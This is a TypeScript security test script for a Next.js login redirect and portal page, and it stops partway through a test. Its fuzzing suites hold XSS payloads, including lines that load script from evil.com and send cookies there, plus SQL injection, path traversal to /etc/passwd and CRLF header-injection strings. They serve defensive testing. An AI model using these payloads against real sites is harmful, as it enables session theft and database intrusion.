/**
 * Challenger M2-1: Empirical Adversarial Root Redirection & Parameter Fuzzing Suite
 *
 * Targets:
 * 1. Root triage matrix on `src/app/page.tsx` across permission truth table:
 *    - Unauthenticated (missing cookie, invalid token, expired token, inactive user)
 *    - Canonical combinations (dual access, single orcamento, single medicao, zero modules)
 *    - Corrupted & non-boolean values (undefined, null, empty strings, numbers)
 *    - Real database personas (admin, orcamentista, apontador, engenheiro)
 *
 * 2. Parameter fuzzing on `src/app/portal/page.tsx` (`/portal?unauthorized=...`):
 *    - Valid whitelist parameters ('orcamentos', 'medicao')
 *    - 25+ XSS attack vectors (asserting zero unhandled exceptions, zero unescaped HTML reflections)
 *    - 12+ SQL injection payloads (asserting zero crashes, safe fallback rendering)
 *    - Extreme unicode, control characters, null bytes, homoglyphs, and RTL overrides
 *    - Long strings & buffer overflow attempts (up to 64KB)
 *    - Malformed types (arrays, prototype pollution keys, objects)
 *
 * 3. Security posture & DOM integrity of `/portal`:
 *    - Card permission states (active link vs locked disabled state)
 *    - Institutional branding (#BA1A1A, #111827, RBTLogo, user badge)
 *    - Defensive alert rendering
 *
 * Usage:
 *   npx tsx scripts/challenger-m2-root-portal.ts
 */

// =========================================================================
// INTERCEPT NEXT.JS SERVER RUNTIME ENVIRONMENT (MUST RUN BEFORE REQUIRING SESSION)
// =========================================================================

const hPath = require.resolve('next/headers');
let activeCookieToken: string | null = null;

require.cache[hPath] = {
  id: hPath,
  filename: hPath,
  loaded: true,
  exports: {
    cookies: () => ({
      get: (name: string) => {
        if (
          (name === 'rbt_orcamentos_session' || name === 'rbt_session') &&
          activeCookieToken
        ) {
          return { value: activeCookieToken };
        }
        return undefined;
      },
      delete: () => {},
      set: () => {},
    }),
  },
} as any;

import React from 'react';
import ReactDOMServer from 'react-dom/server';
import crypto from 'crypto';

const { prisma } = require('../src/lib/db');
const { createSession, SESSION_DURATION_SECONDS, hashToken } = require('../src/lib/session');


// 2. React Context for Next.js App Router (needed by client components like LogoutButton)
const { AppRouterContext } = require('next/dist/shared/lib/app-router-context.shared-runtime');

function renderPageToHtml(jsx: React.ReactElement): string {
  const routerMock = {
    push: () => {},
    replace: () => {},
    refresh: () => {},
    back: () => {},
    forward: () => {},
    prefetch: () => {},
  };
  const wrapped = React.createElement(
    AppRouterContext.Provider,
    { value: routerMock },
    jsx
  );
  return ReactDOMServer.renderToStaticMarkup(wrapped);
}

// 3. Lazy require page components after runtime interception
const HomePage = require('../src/app/page').default;
const PortalPage = require('../src/app/portal/page').default;

// =========================================================================
// TEST RESULT HARNESS
// =========================================================================

interface TestResult {
  suite: string;
  testId: string;
  name: string;
  passed: boolean;
  durationMs: number;
  details?: string;
}

const results: TestResult[] = [];

function recordTest(res: TestResult) {
  results.push(res);
  const mark = res.passed ? '✓ PASS' : '✗ FAIL';
  console.log(`[${mark}] [${res.suite}] ${res.testId}: ${res.name} (${res.durationMs.toFixed(2)}ms)`);
  if (!res.passed && res.details) {
    console.error(`       Failure Detail: ${res.details}`);
  }
}

/**
 * Extracts target destination from NEXT_REDIRECT digest
 * Format: NEXT_REDIRECT;replace;/target;307; or NEXT_REDIRECT;push;/target;307;
 */
function extractRedirectUrl(error: any): string | null {
  if (!error) return null;
  const digest = error.digest || error.message || '';
  if (typeof digest === 'string' && digest.startsWith('NEXT_REDIRECT;')) {
    const parts = digest.split(';');
    return parts[2] || null;
  }
  return null;
}

// =========================================================================
// SUITE 1: ROOT GATEWAY REDIRECTION MATRIX ('/')
// =========================================================================

async function runRootTriageSuite() {
  console.log('\n===============================================================');
  console.log('  SUITE 1: ROOT GATEWAY REDIRECTION MATRIX (src/app/page.tsx)');
  console.log('===============================================================');

  // Test 1.1: Unauthenticated - No Cookie
  {
    const start = performance.now();
    activeCookieToken = null;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }
    const passed = redirectUrl === '/login';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-UNAUTH-01',
      name: 'Unauthenticated visitor (no cookie) redirects to /login',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /login, got ${redirectUrl}`,
    });
  }

  // Test 1.2: Unauthenticated - Invalid / Non-existent token in DB
  {
    const start = performance.now();
    activeCookieToken = 'completely_invalid_token_1234567890abcdef';
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }
    const passed = redirectUrl === '/login';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-UNAUTH-02',
      name: 'Forged / non-existent session token redirects to /login',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /login, got ${redirectUrl}`,
    });
  }

  // Test 1.3: Unauthenticated - Expired token in DB
  {
    const start = performance.now();
    const expiredToken = crypto.randomBytes(32).toString('hex');
    const tokenHash = hashToken(expiredToken);
    const adminUser = await prisma.user.findFirst({ where: { role: 'ADMIN' } });
    if (!adminUser) throw new Error('Admin user required for test');

    // Create session already expired 1 hour ago
    await prisma.session.create({
      data: {
        userId: adminUser.id,
        tokenHash,
        expiresAt: new Date(Date.now() - 3600 * 1000),
      },
    });

    activeCookieToken = expiredToken;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    const passed = redirectUrl === '/login';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-UNAUTH-03',
      name: 'Expired session token in DB redirects to /login',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /login, got ${redirectUrl}`,
    });
  }

  // Test 1.4: Inactive User (ativo: false)
  {
    const start = performance.now();
    const inactiveUser = await prisma.user.create({
      data: {
        email: `inactive-test-${Date.now()}@rbt.com.br`,
        name: 'Inactive User Test',
        passwordHash: 'dummy',
        role: 'ORCAMENTISTA',
        ativo: false,
        acessoOrcamento: true,
        acessoMedicao: true,
      },
    });

    const token = await createSession(inactiveUser.id);
    activeCookieToken = token;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    // Cleanup
    await prisma.session.deleteMany({ where: { userId: inactiveUser.id } });
    await prisma.user.delete({ where: { id: inactiveUser.id } });

    const passed = redirectUrl === '/login';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-UNAUTH-04',
      name: 'Inactive user (ativo: false) blocked and redirected to /login',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /login, got ${redirectUrl}`,
    });
  }

  // Test 1.5: Canonical Dual-Module Access (Orçamentos + Medição)
  {
    const start = performance.now();
    const dualUser = await prisma.user.create({
      data: {
        email: `dual-test-${Date.now()}@rbt.com.br`,
        name: 'Dual Access User',
        passwordHash: 'dummy',
        role: 'ADMIN',
        ativo: true,
        acessoOrcamento: true,
        acessoMedicao: true,
      },
    });

    const token = await createSession(dualUser.id);
    activeCookieToken = token;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    await prisma.session.deleteMany({ where: { userId: dualUser.id } });
    await prisma.user.delete({ where: { id: dualUser.id } });

    const passed = redirectUrl === '/portal';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-CANON-01',
      name: 'Dual-module access redirects directly to /portal hub',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /portal, got ${redirectUrl}`,
    });
  }

  // Test 1.6: Single Access Orçamentos (acessoOrcamento: true, acessoMedicao: false)
  {
    const start = performance.now();
    const orcUser = await prisma.user.create({
      data: {
        email: `orc-test-${Date.now()}@rbt.com.br`,
        name: 'Orcamento Single User',
        passwordHash: 'dummy',
        role: 'ORCAMENTISTA',
        ativo: true,
        acessoOrcamento: true,
        acessoMedicao: false,
      },
    });

    const token = await createSession(orcUser.id);
    activeCookieToken = token;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    await prisma.session.deleteMany({ where: { userId: orcUser.id } });
    await prisma.user.delete({ where: { id: orcUser.id } });

    const passed = redirectUrl === '/dashboard';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-CANON-02',
      name: 'Single Orçamentos access bypasses hub and redirects to /dashboard',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /dashboard, got ${redirectUrl}`,
    });
  }

  // Test 1.7: Single Access Medição (acessoOrcamento: false, acessoMedicao: true)
  {
    const start = performance.now();
    const medUser = await prisma.user.create({
      data: {
        email: `med-test-${Date.now()}@rbt.com.br`,
        name: 'Medicao Single User',
        passwordHash: 'dummy',
        role: 'APONTADOR',
        ativo: true,
        acessoOrcamento: false,
        acessoMedicao: true,
      },
    });

    const token = await createSession(medUser.id);
    activeCookieToken = token;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    await prisma.session.deleteMany({ where: { userId: medUser.id } });
    await prisma.user.delete({ where: { id: medUser.id } });

    const passed = redirectUrl === '/medicao';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-CANON-03',
      name: 'Single Medição access bypasses hub and redirects to /medicao',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /medicao, got ${redirectUrl}`,
    });
  }

  // Test 1.8: Zero Modules Enabled (acessoOrcamento: false, acessoMedicao: false)
  {
    const start = performance.now();
    const zeroUser = await prisma.user.create({
      data: {
        email: `zero-test-${Date.now()}@rbt.com.br`,
        name: 'Zero Modules User',
        passwordHash: 'dummy',
        role: 'ORCAMENTISTA',
        ativo: true,
        acessoOrcamento: false,
        acessoMedicao: false,
      },
    });

    const token = await createSession(zeroUser.id);
    activeCookieToken = token;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    await prisma.session.deleteMany({ where: { userId: zeroUser.id } });
    await prisma.user.delete({ where: { id: zeroUser.id } });

    const passed = redirectUrl === '/login?error=no_modules';
    recordTest({
      suite: 'Root Triage',
      testId: 'ROOT-CANON-04',
      name: 'Zero modules user redirects to /login?error=no_modules',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected /login?error=no_modules, got ${redirectUrl}`,
    });
  }

  // Test 1.9: Real Production Personas Verification
  const personas = [
    { email: 'admin@rbt.com.br', expected: '/portal', label: 'Admin (Dual)' },
    { email: 'orcamentista@rbt.com.br', expected: '/dashboard', label: 'Orcamentista (Single Orc)' },
    { email: 'apontador@rbtfundacoes.com.br', expected: '/medicao', label: 'Apontador (Single Med)' },
    { email: 'engenheiro@rbtfundacoes.com.br', expected: '/medicao', label: 'Engenheiro (Single Med)' },
    { email: 'admin@rbtfundacoes.com.br', expected: '/portal', label: 'Admin Fundacoes (Dual)' },
  ];

  for (const persona of personas) {
    const start = performance.now();
    const user = await prisma.user.findUnique({ where: { email: persona.email } });
    if (!user) {
      recordTest({
        suite: 'Root Triage',
        testId: `ROOT-PERSONA-${persona.email}`,
        name: `Persona: ${persona.label}`,
        passed: false,
        durationMs: performance.now() - start,
        details: `Seed user ${persona.email} not found in database`,
      });
      continue;
    }

    const token = await createSession(user.id);
    activeCookieToken = token;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    }

    await prisma.session.deleteMany({ where: { userId: user.id } });

    const passed = redirectUrl === persona.expected;
    recordTest({
      suite: 'Root Triage',
      testId: `ROOT-PERSONA-${persona.email.split('@')[0]}`,
      name: `Persona: ${persona.label} -> ${persona.expected}`,
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected ${persona.expected}, got ${redirectUrl}`,
    });
  }

  // Test 1.10: Legacy / Corrupted Fields Defensive Role Fallback Matrix
  // In case older database records had null or non-boolean permission flags
  const legacyCases = [
    { role: 'ORCAMENTISTA', orc: null, med: null, expected: '/dashboard', label: 'Legacy ORCAMENTISTA with null flags' },
    { role: 'APONTADOR', orc: null, med: null, expected: '/medicao', label: 'Legacy APONTADOR with null flags' },
    { role: 'ENGENHEIRO', orc: null, med: null, expected: '/medicao', label: 'Legacy ENGENHEIRO with null flags' },
    { role: 'ADMIN', orc: null, med: null, expected: '/portal', label: 'Legacy ADMIN with null flags' },
    { role: 'UNKNOWN_ROLE', orc: null, med: null, expected: '/login?error=no_modules', label: 'Legacy Unknown Role with null flags' },
    { role: 'ADMIN', orc: false, med: false, expected: '/login?error=no_modules', label: 'Admin with explicit false/false overrides default' },
  ];

  for (let idx = 0; idx < legacyCases.length; idx++) {
    const lc = legacyCases[idx];
    const start = performance.now();

    // Use raw query or mock findUnique to simulate legacy records with null values
    const originalFindUnique = prisma.session.findUnique;
    const originalUpdate = prisma.session.update;
    const dummySessionId = `dummy-legacy-${idx}-${Date.now()}`;
    const dummyToken = crypto.randomBytes(32).toString('hex');

    prisma.session.update = (async () => ({})) as any;
    prisma.session.findUnique = (async () => ({
      id: dummySessionId,
      userId: `dummy-u-${idx}`,
      tokenHash: hashToken(dummyToken),
      expiresAt: new Date(Date.now() + 10 * 3600 * 1000),
      ipAddress: '127.0.0.1',
      userAgent: 'Challenger/1.0',
      createdAt: new Date(),
      updatedAt: new Date(),
      user: {
        id: `dummy-u-${idx}`,
        name: `Legacy User ${idx}`,
        nome: `Legacy User ${idx}`,
        email: `legacy-${idx}@rbt.com.br`,
        role: lc.role,
        ativo: true,
        telefone: null,
        acessoOrcamento: lc.orc as any,
        acessoMedicao: lc.med as any,
      },
    })) as any;

    activeCookieToken = dummyToken;
    let redirectUrl: string | null = null;
    try {
      await HomePage();
    } catch (e: any) {
      redirectUrl = extractRedirectUrl(e);
    } finally {
      prisma.session.findUnique = originalFindUnique;
      prisma.session.update = originalUpdate;
    }

    const passed = redirectUrl === lc.expected;
    recordTest({
      suite: 'Legacy Fallback Matrix',
      testId: `ROOT-LEGACY-0${idx + 1}`,
      name: lc.label,
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : `Expected ${lc.expected}, got ${redirectUrl}`,
    });
  }
}

// =========================================================================
// SUITE 2: PARAMETER FUZZING ON /portal?unauthorized=... (src/app/portal/page.tsx)
// =========================================================================

async function runPortalFuzzingSuite() {
  console.log('\n===============================================================');
  console.log('  SUITE 2: ADVERSARIAL PARAMETER FUZZING ON /portal (XSS/SQLi)');
  console.log('===============================================================');

  // Authenticate as dual-access Admin for portal SSR tests
  const adminUser = await prisma.user.findFirst({
    where: { email: 'admin@rbt.com.br' },
  });
  if (!adminUser) throw new Error('admin@rbt.com.br persona required for portal tests');

  const adminToken = await createSession(adminUser.id);
  activeCookieToken = adminToken;

  // 2.1 Baseline: Whitelist Parameters
  {
    const start = performance.now();
    const jsx = await PortalPage({ searchParams: { unauthorized: 'orcamentos' } });
    const html = renderPageToHtml(jsx);
    const hasAlert = html.includes('Acesso Restrito ao Módulo de Orçamentos');
    const hasBadge = html.includes('Gestão de Orçamentos');
    const passed = hasAlert && hasBadge;
    recordTest({
      suite: 'Portal Parameters',
      testId: 'PORTAL-WHITE-01',
      name: 'Valid parameter unauthorized=orcamentos renders contextual alert',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : 'Missing contextual alert or badge in HTML',
    });
  }

  {
    const start = performance.now();
    const jsx = await PortalPage({ searchParams: { unauthorized: 'medicao' } });
    const html = renderPageToHtml(jsx);
    const hasAlert = html.includes('Acesso Restrito ao Módulo de Medição Diária');
    const hasBadge = html.includes('Medição Diária (RDP)');
    const passed = hasAlert && hasBadge;
    recordTest({
      suite: 'Portal Parameters',
      testId: 'PORTAL-WHITE-02',
      name: 'Valid parameter unauthorized=medicao renders contextual alert',
      passed,
      durationMs: performance.now() - start,
      details: passed ? undefined : 'Missing contextual alert or badge in HTML',
    });
  }

  // 2.2 Neutral & Boundary Parameters
  const neutralCases = [
    { id: 'PORTAL-NEUTRAL-01', name: 'searchParams undefined', input: undefined, shouldAlert: false },
    { id: 'PORTAL-NEUTRAL-02', name: 'searchParams empty object', input: {}, shouldAlert: false },
    { id: 'PORTAL-NEUTRAL-03', name: 'unauthorized empty string', input: { unauthorized: '' }, shouldAlert: false },
    { id: 'PORTAL-NEUTRAL-04', name: 'unauthorized whitespace only', input: { unauthorized: '   ' }, shouldAlert: true },
    { id: 'PORTAL-NEUTRAL-05', name: 'unauthorized unknown word', input: { unauthorized: 'financeiro' }, shouldAlert: true },
  ];

  for (const tc of neutralCases) {
    const start = performance.now();
    let crashed = false;
    let html = '';
    try {
      const jsx = await PortalPage({ searchParams: tc.input as any });
      html = renderPageToHtml(jsx);
    } catch {
      crashed = true;
    }

    const hasAlert = html.includes('Acesso Não Autorizado');
    const passed = !crashed && (tc.shouldAlert ? hasAlert : !hasAlert);
    recordTest({
      suite: 'Portal Parameters',
      testId: tc.id,
      name: tc.name,
      passed,
      durationMs: performance.now() - start,
      details: crashed
        ? 'SSR render crashed'
        : passed
        ? undefined
        : `Alert presence mismatch: expected ${tc.shouldAlert}, got ${hasAlert}`,
    });
  }

  // 2.3 Comprehensive XSS Injection Payloads (28 vectors)
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<script src="https://evil.com/xss.js"></script>',
    '"><script>alert(document.cookie)</script>',
    '"><img src=x onerror=alert(1)>',
    '<img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(\'XSS\')>',
    '<iframe src="javascript:alert(1)"></iframe>',
    'javascript:alert(1)',
    '"><a href="javascript:alert(1)">click me</a>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<video><source onerror="alert(1)">',
    '<audio src/onerror=alert(1)>',
    '<marquee onstart=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<style>body{background:red;}</style>',
    '<link rel="stylesheet" href="http://evil.com/xss.css">',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    'vbscript:msgbox("XSS")',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '--><script>alert(1)</script><!--',
  ];

  console.log(`\nExecuting ${xssPayloads.length} Adversarial XSS Injection Challenges...`);

  for (let i = 0; i < xssPayloads.length; i++) {
    const payload = xssPayloads[i];
    const start = performance.now();
    let crashed = false;
    let html = '';
    let errorMsg = '';

    try {
      const jsx = await PortalPage({ searchParams: { unauthorized: payload } });
      html = renderPageToHtml(jsx);
    } catch (e: any) {
      crashed = true;
      errorMsg = e.message || String(e);
    }

    // Security assertions:
    // 1. SSR must not crash
    // 2. Raw unescaped payload MUST NOT appear in the generated HTML
    // 3. Fallback generic alert must be displayed safely
    const leaksRawPayload = html.includes(payload);
    const hasGenericAlert = html.includes('Acesso Não Autorizado');
    const passed = !crashed && !leaksRawPayload && hasGenericAlert;

    recordTest({
      suite: 'XSS Fuzzing',
      testId: `XSS-FUZZ-${String(i + 1).padStart(2, '0')}`,
      name: `Vector: ${payload.slice(0, 32)}...`,
      passed,
      durationMs: performance.now() - start,
      details: crashed
        ? `Component crashed: ${errorMsg}`
        : leaksRawPayload
        ? 'CRITICAL: Raw unescaped XSS payload reflected into HTML!'
        : !hasGenericAlert
        ? 'Missing generic fallback alert'
        : undefined,
    });
  }

  // 2.4 SQL Injection & Command Injection Payloads (14 vectors)
  const sqliPayloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' UNION SELECT id, email, passwordHash FROM users --",
    "' UNION ALL SELECT null, null, null --",
    "1' AND SLEEP(5) --",
    "admin' --",
    "') OR ('1'='1",
    "admin' /*",
    "' OR 'x'='x",
    "benchmark(10000000,MD5(1))",
    "'; EXEC xp_cmdshell('dir'); --",
    "../../../../etc/passwd",
    "..\..\\..\\windows\\system32\\cmd.exe",
  ];

  console.log(`\nExecuting ${sqliPayloads.length} Adversarial SQLi / Path Traversal Challenges...`);

  for (let i = 0; i < sqliPayloads.length; i++) {
    const payload = sqliPayloads[i];
    const start = performance.now();
    let crashed = false;
    let html = '';
    let errorMsg = '';

    try {
      const jsx = await PortalPage({ searchParams: { unauthorized: payload } });
      html = renderPageToHtml(jsx);
    } catch (e: any) {
      crashed = true;
      errorMsg = e.message || String(e);
    }

    const leaksRawPayload = html.includes(payload);
    const hasGenericAlert = html.includes('Acesso Não Autorizado');
    const passed = !crashed && !leaksRawPayload && hasGenericAlert;

    recordTest({
      suite: 'SQLi Fuzzing',
      testId: `SQLI-FUZZ-${String(i + 1).padStart(2, '0')}`,
      name: `Payload: ${payload.slice(0, 32)}...`,
      passed,
      durationMs: performance.now() - start,
      details: crashed
        ? `Component crashed: ${errorMsg}`
        : leaksRawPayload
        ? 'Payload reflected into HTML'
        : !hasGenericAlert
        ? 'Missing generic fallback alert'
        : undefined,
    });
  }

  // 2.5 Unicode Overflow, Control Characters, Homoglyphs & RTL Overrides
  const unicodeCases = [
    { id: 'UNI-01', name: 'Right-to-left override mark (U+202E)', input: '\u202E\u0041\u0042\u0043' },
    { id: 'UNI-02', name: 'Zero-width space sequence', input: '\u200B\u200C\u200D\uFEFF' },
    { id: 'UNI-03', name: 'Cyrillic homoglyphs: оrсаmеntоs (visually identical)', input: '\u043Er\u0441\u0430m\u0435nt\u043Es' },
    { id: 'UNI-04', name: 'Emoji bomb string', input: '🚀💥💣💀🚨🔥✨🏗️🛡️🔒' },
    { id: 'UNI-05', name: 'Null byte injection in string', input: 'orcamentos\0.malicious' },
    { id: 'UNI-06', name: 'CRLF header injection in param', input: 'orcamentos\r\nSet-Cookie: evil=1' },
    { id: 'UNI-07', name: 'Tab and vertical tab characters', input: '\torcamentos\v\f' },
  ];

  for (const uc of unicodeCases) {
    const start = performance.now();
    let crashed = false;
    let html = '';

    try {
      const jsx = await PortalPage({ searchParams: { unauthorized: uc.input } });
      html = renderPageToHtml(jsx);
    } catch {
      crashed = true;
    }

    // Cyrillic homoglyph must NOT activate legitimate orcamentos alert
    const correctlyFellBack =
      uc.id === 'UNI-03'
        ? !html.includes('Acesso Restrito ao Módulo de Orçamentos') && html.includes('Acesso Não Autorizado')
        : html.includes('Acesso Não Autorizado');

    const passed = !crashed && correctlyFellBack;
    recordTest({
      suite: 'Unicode Fuzzing',
      testId: uc.id,
      name: uc.name,
      passed,
      durationMs: performance.now() - start,
      details: crashed ? 'Crashed on unicode input' : passed ? undefined : 'Failed safe fallback logic',
    });
  }

  // 2.6 Buffer & Length Fuzzing (1KB, 10KB, 64KB)
  const lengthCases = [
    { id: 'BUF-01', name: '1 KB repetitive string', len: 1024 },
    { id: 'BUF-02', name: '10 KB repetitive string', len: 10240 },
    { id: 'BUF-03', name: '64 KB repetitive string', len: 65536 },
  ];

  for (const lc of lengthCases) {
    const start = performance.now();
    const bigString = 'A'.repeat(lc.len);
    let crashed = false;
    let html = '';

    try {
      const jsx = await PortalPage({ searchParams: { unauthorized: bigString } });
      html = renderPageToHtml(jsx);
    } catch {
      crashed = true;
    }

    const passed = !crashed && html.includes('Acesso Não Autorizado') && !html.includes(bigString);
    recordTest({
      suite: 'Buffer Fuzzing',
      testId: lc.id,
      name: `${lc.name} (${lc.len} bytes)`,
      passed,
      durationMs: performance.now() - start,
      details: crashed ? 'Crashed on large string' : passed ? undefined : 'Leaked large buffer or missing alert',
    });
  }

  // 2.7 Malformed Types & Protocol Abuse (Arrays, Prototype Pollution Keys)
  const malformedCases = [
    { id: 'TYPE-01', name: 'Array of valid modules [orcamentos, medicao]', input: ['orcamentos', 'medicao'] as any },
    { id: 'TYPE-02', name: 'Array with XSS vector', input: ['<script>alert(1)</script>', 'orcamentos'] as any },
    { id: 'TYPE-03', name: 'Prototype pollution key: __proto__', input: '__proto__' },
    { id: 'TYPE-04', name: 'Prototype pollution key: constructor', input: 'constructor' },
    { id: 'TYPE-05', name: 'Prototype pollution key: prototype', input: 'prototype' },
    { id: 'TYPE-06', name: 'Method key: toString', input: 'toString' },
    { id: 'TYPE-07', name: 'Method key: valueOf', input: 'valueOf' },
  ];

  for (const mc of malformedCases) {
    const start = performance.now();
    let crashed = false;
    let html = '';

    try {
      const jsx = await PortalPage({ searchParams: { unauthorized: mc.input } });
      html = renderPageToHtml(jsx);
    } catch {
      crashed = true;
    }

    const hasGenericAlert = html.includes('Acesso Não Autorizado');
    const passed = !crashed && hasGenericAlert;
    recordTest({
      suite: 'Type Abuse',
      testId: mc.id,
      name: mc.name,
      passed,
      durationMs: performance.now() - start,
      details: crashed ? 'Crashed on malformed type' : passed ? undefined : 'Missing generic fallback alert',
    });
  }

  // Cleanup admin session
  await prisma.session.deleteMany({ where: { userId: adminUser.id } });
}

// =========================================================================
// SUITE 3: DOM INTEGRITY & CARD PERMISSION RENDERING
// =========================================================================

async function runDomIntegritySuite() {
  console.log('\n===============================================================');
  console.log('  SUITE 3: DOM INTEGRITY, BRANDING & CARD PERMISSION STATES');
  console.log('===============================================================');

  // Test 3.1: Dual-Module Persona DOM State
  {
    const start = performance.now();
    const dualUser = await prisma.user.create({
      data: {
        email: `dom-dual-${Date.now()}@rbt.com.br`,
        name: 'Wellington Dantas',
        passwordHash: 'dummy',
        role: 'ADMIN',
        ativo: true,
        acessoOrcamento: true,
        acessoMedicao: true,
      },
    });

    activeCookieToken = await createSession(dualUser.id);
    const jsx = await PortalPage({});
    const html = renderPageToHtml(jsx);

    // Both cards must have active access link
    const hasOrcamentoLink = html.includes('href="/dashboard"');
    const hasMedicaoLink = html.includes('href="/medicao"');
    const hasUnlockedBadges = (html.match(/Acesso Liberado/g) || []).length === 2;
    const hasNoModulesWarning = html.includes('Nenhum Módulo Corporativo Habilitado');
    const hasUserName = html.includes('Wellington Dantas');
    const hasUserInitials = html.includes('WD');
    const hasRBTBranding = html.includes('RBT') && html.includes('#BA1A1A') && html.includes('#111827');

    await prisma.session.deleteMany({ where: { userId: dualUser.id } });
    await prisma.user.delete({ where: { id: dualUser.id } });

    const passed =
      hasOrcamentoLink &&
      hasMedicaoLink &&
      hasUnlockedBadges &&
      !hasNoModulesWarning &&
      hasUserName &&
      hasUserInitials &&
      hasRBTBranding;

    recordTest({
      suite: 'DOM Integrity',
      testId: 'DOM-PERM-DUAL',
      name: 'Dual-access user renders both cards active, WD badge, and full branding',
      passed,
      durationMs: performance.now() - start,
      details: passed
        ? undefined
        : `Flags: orcLink=${hasOrcamentoLink}, medLink=${hasMedicaoLink}, badges=${hasUnlockedBadges}, noMod=${hasNoModulesWarning}`,
    });
  }

  // Test 3.2: Single Orcamentos Persona DOM State
  {
    const start = performance.now();
    const orcUser = await prisma.user.create({
      data: {
        email: `dom-orc-${Date.now()}@rbt.com.br`,
        name: 'Carlos Orcamentista',
        passwordHash: 'dummy',
        role: 'ORCAMENTISTA',
        ativo: true,
        acessoOrcamento: true,
        acessoMedicao: false,
      },
    });

    activeCookieToken = await createSession(orcUser.id);
    const jsx = await PortalPage({});
    const html = renderPageToHtml(jsx);

    const hasOrcamentoLink = html.includes('href="/dashboard"');
    const hasMedicaoLink = html.includes('href="/medicao"');
    const hasMedicaoLocked = html.includes('Acesso não habilitado');

    await prisma.session.deleteMany({ where: { userId: orcUser.id } });
    await prisma.user.delete({ where: { id: orcUser.id } });

    const passed = hasOrcamentoLink && !hasMedicaoLink && hasMedicaoLocked;
    recordTest({
      suite: 'DOM Integrity',
      testId: 'DOM-PERM-ORC',
      name: 'Single Orçamentos user has active /dashboard and locked Medição card',
      passed,
      durationMs: performance.now() - start,
      details: passed
        ? undefined
        : `Flags: orcLink=${hasOrcamentoLink}, medLink=${hasMedicaoLink}, medLocked=${hasMedicaoLocked}`,
    });
  }

  // Test 3.3: Single Medicao Persona DOM State
  {
    const start = performance.now();
    const medUser = await prisma.user.create({
      data: {
        email: `dom-med-${Date.now()}@rbt.com.br`,
        name: 'Joao Apontador',
        passwordHash: 'dummy',
        role: 'APONTADOR',
        ativo: true,
        acessoOrcamento: false,
        acessoMedicao: true,
      },
    });

    activeCookieToken = await createSession(medUser.id);
    const jsx = await PortalPage({});
    const html = renderPageToHtml(jsx);

    const hasOrcamentoLink = html.includes('href="/dashboard"');
    const hasMedicaoLink = html.includes('href="/medicao"');
    const hasOrcamentoLocked = html.includes('Acesso não habilitado');

    await prisma.session.deleteMany({ where: { userId: medUser.id } });
    await prisma.user.delete({ where: { id: medUser.id } });

    const passed = !hasOrcamentoLink && hasMedicaoLink && hasOrcamentoLocked;
    recordTest({
      suite: 'DOM Integrity',
      testId: 'DOM-PERM-MED',
      name: 'Single Medição user has active /medicao and locked Orçamentos card',
      passed,
      durationMs: performance.now() - start,
      details: passed
        ? undefined
        : `Flags: orcLink=${hasOrcamentoLink}, medLink=${hasMedicaoLink}, orcLocked=${hasOrcamentoLocked}`,
    });
  }

  // Test 3.4: Zero Modules User DOM State
  {
    const start = performance.now();
    const zeroUser = await prisma.user.create({
      data: {
        email: `dom-zero-${Date.now()}@rbt.com.br`,
        name: 'Sem Modulo',
        passwordHash: 'dummy',
        role: 'USUARIO',
        ativo: true,
        acessoOrcamento: false,
        acessoMedicao: false,
      },
    });

    activeCookieToken = await createSession(zeroUser.id);
    const jsx = await PortalPage({});
    const html = renderPageToHtml(jsx);

    const hasOrcamentoLink = html.includes('href="/dashboard"');
    const hasMedicaoLink = html.includes('href="/medicao"');
